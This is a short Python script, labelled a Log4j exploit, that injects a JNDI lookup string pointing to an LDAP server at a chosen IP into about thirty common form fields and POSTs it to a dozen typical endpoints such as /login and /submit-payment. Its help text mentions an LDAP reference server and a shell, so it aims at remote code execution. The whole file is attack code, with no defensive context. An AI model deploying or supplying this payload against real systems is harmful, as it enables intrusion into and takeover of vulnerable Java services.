import argparse
from colorama import Fore, init
import requests 

def postData(ip="localhost"):
    payload = "${jndi:ldap://%s:1389/Exploit}" % (ip)
    endpoints = ['/form-action', '/submit', '/login', '/logout', '/register', 
        '/profile', '/forgot-password', '/search', '/create', '/update', '/delete', '/submit-payment']
    keys = [    "username",    "password",    "email",    "name",    "first_name",    "last_name",    "address",    "phone",    "mobile",    "age",    "birthdate",    "gender",    "occupation",    "company",    "website",    "country",    "state",    "city",    "zipcode",    "message",    "subject",    "comments",    "security_answer",    "security_question",    "captcha",    "agree",    "terms",    "submit",    "login",    "register",    "uname"]
    data = dict()
    for i in keys :
        data[i]=payload
    for i in endpoints:
        if ip=="localhost":
            lru = "http://"+ip+":8080"+i
        else:
            lru= ip+i
        request = requests.post(lru,
        data
        )
        if request == 200:
            print("Form filled successfully!")
def main():
    init(autoreset=True)
 
    parser = argparse.ArgumentParser(description='Log4j exploit')
    parser.add_argument('--ip',
                        metavar='ip',
                        type=str,
                        default='localhost',
                        help='Enter IP for LDAPRefServer & Shell')
    args = parser.parse_args()
    postData(args.ip)
    
if __name__ == "__main__":
    main()
